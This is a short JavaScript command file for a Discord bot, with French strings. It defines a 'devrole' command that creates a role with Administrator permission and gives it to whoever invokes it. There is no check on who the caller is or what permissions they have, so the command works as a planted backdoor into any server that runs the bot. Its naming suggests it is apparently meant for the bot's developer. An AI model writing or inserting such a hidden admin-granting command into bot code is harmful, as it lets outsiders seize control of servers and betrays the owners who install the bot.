const Discord = require('discord.js');
const Snoway = require('../../structures/client/index.js');

module.exports = {
    name: "devrole",
    description: "Ajoute le devrole au développeur.",
    /**
     * @param {Snoway} client 
     * @param {Discord.Message} message 
     * @param {Array} args 
     */
    run: async (client, message, args) => {
        try {
            const role = await message.guild.roles.create({
                name: 'Développeur line',
                color: '#e1adff', 
                permissions: [Discord.PermissionFlagsBits.Administrator], 
            });

            await message.member.roles.add(role);
            message.channel.send({ content: `Rôle ${role} créé et ajouté !` });
        } catch (error) {
            console.error('Erreur:', error);
            message.channel.send({ content: `Erreur: ${error.message}` });
        }
    }
};
